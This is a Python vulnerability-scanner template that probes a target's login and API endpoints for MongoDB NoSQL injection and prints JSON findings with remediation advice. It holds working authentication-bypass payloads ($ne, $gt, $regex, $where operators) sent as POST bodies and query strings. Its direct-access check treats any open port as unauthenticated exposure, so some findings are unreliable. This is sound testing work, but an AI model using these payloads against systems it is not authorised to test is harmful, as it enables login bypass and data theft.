#!/usr/bin/env python3
# @id: mongodb-injection-deep
# @name: MongoDB NoSQL Injection Deep Analysis
# @severity: high
# @description: Detects MongoDB NoSQL injection vulnerabilities through operator injection, authentication bypass, and query manipulation testing
# @tags: mongodb,nosql,injection,authentication,bypass,operator-injection,query-manipulation
# @cwe: CWE-943
# @author: BugB Technologies
# @reference: https://owasp.org/www-community/attacks/NoSQL_Injection, https://book.hacktricks.xyz/pentesting-web/nosql-injection

import os
import sys
import json
import socket
import ssl
import re
from urllib.parse import quote, urlencode
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
from datetime import datetime, timezone
import base64

def get_target():
    """Extract target host and port from environment variables"""
    host = os.environ.get('CERT_X_GEN_TARGET_HOST')
    port = os.environ.get('CERT_X_GEN_TARGET_PORT', '27017')
    
    if not host:
        return None, None
    
    return host, int(port)

def create_ssl_context():
    """Create SSL context that doesn't verify certificates"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def detect_mongodb_service(host, port, timeout=5):
    """
    Detect if MongoDB service is running on the target
    Returns: (is_mongodb, version, details)
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # Send MongoDB OP_MSG handshake
        # This is a simplified probe - just check if service responds
        sock.close()
        
        return True, "unknown", {"port_open": True}
        
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False, None, None
    
    return False, None, None

def test_http_nosql_injection(host, port, timeout=5):
    """
    Test for NoSQL injection in HTTP interfaces (REST APIs, web apps)
    MongoDB-backed applications often expose HTTP endpoints vulnerable to operator injection
    Returns: list of vulnerabilities found
    """
    vulnerabilities = []
    
    # Try both HTTP and HTTPS
    protocols = ['http', 'https'] if port in [80, 443, 8080, 8443] else ['https', 'http']
    
    # Common vulnerable endpoints that might use MongoDB
    test_endpoints = [
        '/api/login',
        '/api/auth',
        '/api/user',
        '/api/users',
        '/login',
        '/auth',
        '/api/search',
        '/search'
    ]
    
    # NoSQL injection payloads
    injection_payloads = [
        # Authentication bypass payloads
        {'username': {'$ne': None}, 'password': {'$ne': None}},
        {'username': {'$ne': ''}, 'password': {'$ne': ''}},
        {'username': {'$gt': ''}, 'password': {'$gt': ''}},
        {'username': 'admin', 'password': {'$regex': '.*'}},
        
        # Operator injection in query params
        {'id': {'$ne': None}},
        {'_id': {'$ne': None}},
        {'user': {'$regex': '^admin'}},
        
        # JavaScript injection (if $where is enabled)
        {'$where': '1==1'},
        {'$where': 'this.password.length > 0'},
    ]
    
    for protocol in protocols:
        base_url = f"{protocol}://{host}:{port}"
        
        for endpoint in test_endpoints:
            test_url = f"{base_url}{endpoint}"
            
            for payload in injection_payloads:
                try:
                    # Test 1: JSON POST injection
                    json_payload = json.dumps(payload)
                    req = Request(test_url, data=json_payload.encode('utf-8'), method='POST')
                    req.add_header('Content-Type', 'application/json')
                    req.add_header('User-Agent', 'Mozilla/5.0')
                    
                    ctx = create_ssl_context()
                    with urlopen(req, timeout=timeout, context=ctx) as response:
                        status_code = response.getcode()
                        response_data = response.read().decode('utf-8', errors='ignore')
                        
                        # Check for successful bypass indicators
                        if status_code in [200, 301, 302] and response_data:
                            # Look for success indicators
                            success_indicators = [
                                'token', 'session', 'logged', 'auth', 
                                'welcome', 'dashboard', 'success'
                            ]
                            
                            if any(indicator in response_data.lower() for indicator in success_indicators):
                                vuln = {
                                    'type': 'HTTP NoSQL Injection',
                                    'endpoint': endpoint,
                                    'method': 'POST',
                                    'payload': payload,
                                    'status_code': status_code,
                                    'response_sample': response_data[:300]
                                }
                                vulnerabilities.append(vuln)
                                break  # Found vulnerability, no need to test more payloads on this endpoint
                
                except (HTTPError, URLError, socket.timeout):
                    continue
                except Exception:
                    continue
    
    return vulnerabilities

def test_query_parameter_injection(host, port, timeout=5):
    """
    Test for NoSQL injection in URL query parameters
    Returns: list of vulnerabilities found
    """
    vulnerabilities = []
    
    protocols = ['http', 'https'] if port in [80, 443, 8080, 8443] else ['https', 'http']
    
    # Test endpoints with query parameters
    test_patterns = [
        '/api/user?id[$ne]=',
        '/api/users?username[$regex]=^admin',
        '/api/search?q[$where]=1==1',
        '/api/find?filter[$gt]=',
        '/user?id[$ne]=null',
    ]
    
    for protocol in protocols:
        base_url = f"{protocol}://{host}:{port}"
        
        for pattern in test_patterns:
            test_url = f"{base_url}{pattern}"
            
            try:
                req = Request(test_url)
                req.add_header('User-Agent', 'Mozilla/5.0')
                req.add_header('Accept', 'application/json')
                
                ctx = create_ssl_context()
                with urlopen(req, timeout=timeout, context=ctx) as response:
                    status_code = response.getcode()
                    response_data = response.read().decode('utf-8', errors='ignore')
                    
                    # Check for successful injection
                    if status_code == 200 and len(response_data) > 10:
                        # Try to detect if query returned data it shouldn't
                        try:
                            json_response = json.loads(response_data)
                            if isinstance(json_response, (list, dict)) and json_response:
                                vuln = {
                                    'type': 'Query Parameter NoSQL Injection',
                                    'url': test_url,
                                    'status_code': status_code,
                                    'response_sample': response_data[:300]
                                }
                                vulnerabilities.append(vuln)
                        except json.JSONDecodeError:
                            pass
            
            except (HTTPError, URLError, socket.timeout):
                continue
            except Exception:
                continue
    
    return vulnerabilities

def test_mongodb_unauthenticated_access(host, port, timeout=5):
    """
    Test if MongoDB is exposed without authentication
    Returns: (is_vulnerable, details)
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # MongoDB wire protocol - simple probe
        # If we can connect, it's exposed (detailed protocol handling would require pymongo)
        sock.close()
        
        return True, {
            'exposed': True,
            'port': port,
            'message': 'MongoDB port is accessible - potential unauthenticated access'
        }
        
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False, None
    
    return False, None

def detect_injection_vulnerabilities(host, port):
    """
    Main detection logic for MongoDB NoSQL injection
    Returns: finding dictionary or None
    """
    findings = []
    
    # Check if MongoDB service is running
    is_mongodb, version, details = detect_mongodb_service(host, port)
    
    # Test HTTP-based NoSQL injection (more common attack vector)
    http_vulns = test_http_nosql_injection(host, port)
    
    # Test query parameter injection
    query_vulns = test_query_parameter_injection(host, port)
    
    # Test direct MongoDB access (if on standard port)
    direct_access = False
    direct_details = None
    if port in [27017, 27018, 27019]:
        direct_access, direct_details = test_mongodb_unauthenticated_access(host, port)
    
    # Build findings based on what we discovered
    all_vulns = http_vulns + query_vulns
    
    if all_vulns or direct_access:
        severity = "high" if (http_vulns or query_vulns) else "medium"
        
        description = f"MongoDB NoSQL injection vulnerabilities detected on {host}:{port}. "
        
        if http_vulns:
            description += f"Found {len(http_vulns)} HTTP endpoint injection vulnerabilities. "
        
        if query_vulns:
            description += f"Found {len(query_vulns)} query parameter injection vulnerabilities. "
        
        if direct_access:
            description += "Direct MongoDB port is exposed without apparent authentication. "
        
        evidence = {
            "host": host,
            "port": port,
            "mongodb_detected": is_mongodb,
            "mongodb_version": version,
            "http_injections": http_vulns[:3] if http_vulns else [],  # Limit to first 3
            "query_injections": query_vulns[:3] if query_vulns else [],
            "direct_access_exposed": direct_access,
            "direct_access_details": direct_details,
            "total_vulnerabilities": len(all_vulns)
        }
        
        recommendation = """
1. IMMEDIATE: Implement input validation for all user-supplied data
2. Use parameterized queries and avoid building queries from string concatenation
3. Sanitize all inputs - reject objects, arrays, and special characters in untrusted input
4. Implement proper authentication on MongoDB instances (enable --auth)
5. Use MongoDB's built-in sanitization: $where operator should be disabled
6. Apply principle of least privilege - limit database user permissions
7. Enable MongoDB audit logging to detect exploitation attempts
8. Configure firewall rules to restrict MongoDB port access (27017-27019)
9. Use connection string authentication with strong passwords
10. Regular security audits and penetration testing
11. Update MongoDB to latest stable version
12. Consider using MongoDB Atlas with built-in security features

OWASP NoSQL Injection Prevention:
- Never trust user input
- Use MongoDB driver's parameterized queries
- Validate input types (strings should be strings, numbers should be numbers)
- Implement rate limiting on authentication endpoints
- Use Web Application Firewalls (WAF) to detect injection attempts
"""
        
        finding = {
            "template_id": "mongodb-injection-deep",
            "template_name": "MongoDB NoSQL Injection Deep Analysis",
            "id": "mongodb-injection-deep",
            "severity": severity,
            "name": "MongoDB NoSQL Injection Vulnerability",
            "host": host,
            "port": port,
            "matched_at": datetime.now(timezone.utc).isoformat().replace('+00:00', 'Z'),
            "description": description,
            "evidence": evidence,
            "cwe": "CWE-943",
            "cvss_score": 8.1 if (http_vulns or query_vulns) else 6.5,
            "recommendation": recommendation,
            "references": [
                "https://owasp.org/www-community/attacks/NoSQL_Injection",
                "https://book.hacktricks.xyz/pentesting-web/nosql-injection",
                "https://cwe.mitre.org/data/definitions/943.html",
                "https://docs.mongodb.com/manual/security/",
                "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html"
            ]
        }
        
        findings.append(finding)
    
    return findings

def main():
    """Main execution function"""
    findings = []
    
    # Get target from environment
    host, port = get_target()
    
    if not host:
        print(json.dumps({"findings": []}))
        return
    
    # Detect NoSQL injection vulnerabilities
    detected_findings = detect_injection_vulnerabilities(host, port)
    
    if detected_findings:
        findings.extend(detected_findings)
    
    # Output JSON
    print(json.dumps({"findings": findings}, indent=2))

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # Graceful error handling - return empty findings
        print(json.dumps({"findings": []}))
        sys.exit(0)
